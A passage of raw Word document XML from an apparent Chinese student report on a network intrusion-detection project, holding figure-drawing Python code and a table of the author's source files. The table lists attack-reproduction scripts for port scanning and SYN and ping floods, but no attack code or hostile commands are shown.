        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("证据链", "evidence"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE6D9AB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("处置建议", "actions"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0AE47D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("协议原理回顾", "principle"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742226BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B13D097">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fw, fg, x0 = 27.5, 3.2, 5.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0438BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i, (zh, en) in enumerate(fields):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45975238">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fx = x0 + i * (fw + fg)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7942E389">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ax.add_patch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6124FAB1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            FancyBboxPatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33887113">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                (fx, 9), fw, 23,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D6D36F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                boxstyle="round,pad=0,rounding_size=1.0",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A933192">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                linewidth=1.2, edgecolor=C["view"][0], facecolor="white", zorder=3,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F075800">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0232D540">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52413448">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ax.text(fx + fw / 2, 25.5, zh, ha="center", va="center",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3F0ADD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                fontsize=9.6, color=C["view"][0], weight="bold", zorder=4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3C3930">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ax.text(fx + fw / 2, 16.8, en, ha="center", va="center",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048027BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                fontsize=8.4, color=GREY, zorder=4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C97A94">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="626791EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig.savefig(OUT / "fig3_llm_pipeline.png", dpi=300)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D9F6D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    plt.close(fig)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04CFFA57">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A0634D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="385D2093">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBC0D01">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig_architecture()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D1167F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig_ml_model()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB14556">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig_hybrid_forest()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4FBA3E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig_llm_pipeline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D6FD26">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for p in sorted(OUT.glob("*.png")):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BC405B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"{p.name}  {p.stat().st_size // 1024} KB")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64794997">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="104C6F44">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3.2 姚霖锋：嗅探、中心服务与攻击复现（M1 / M6 / M7 / M10）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638F08C8">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本人负责的是“数据从哪里来、落后到哪里去”这一段：边缘侧的抓包与上报、中心侧的接口与存储、以及与检测链路配套的攻击复现脚本。这一段是整条链路的骨架，下游的特征、模型、大模型、看板都挂在它上面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6063189E">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-2　本部分涉及的源文件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1134"/>
        <w:gridCol w:w="5102"/>
      </w:tblGrid>
      <w:tr w14:paraId="539D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shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1936189F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7BD68366">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>行数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1E7BC04D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>职责</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="057F6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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7B7CE3EC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>probe/sniffer.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="31C95DF0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>245</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="506FB7E3">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>网卡抓包、双向会话聚合、pcap 与特征 CSV 落盘</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="326C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2E54309B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>probe/reporter.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2331AA61">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>83</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="03AA00EE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>批次上报客户端，带列序名与 Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="199A8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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="69ADA7C6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>center/main.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0ED9E9CC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>278</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1D383949">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>八个 HTTP 路由，上报 → 推理 → 告警 → 后台诊断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="7C1BA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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="520BCD2A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>center/database.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="037FEB8E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>293</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="101F34D1">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>SQLite 四张表、查询与补列迁移</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="11A1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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5B631BED">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>attack/*.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3EAB4E81">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>212</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="42C0C1F3">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>端口扫描、SYN 洪泛、ping 洪泛与共用的安全护栏</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="13F159FB">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="767E9146">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.2.1 抓包与会话聚合</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262AB9A5">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
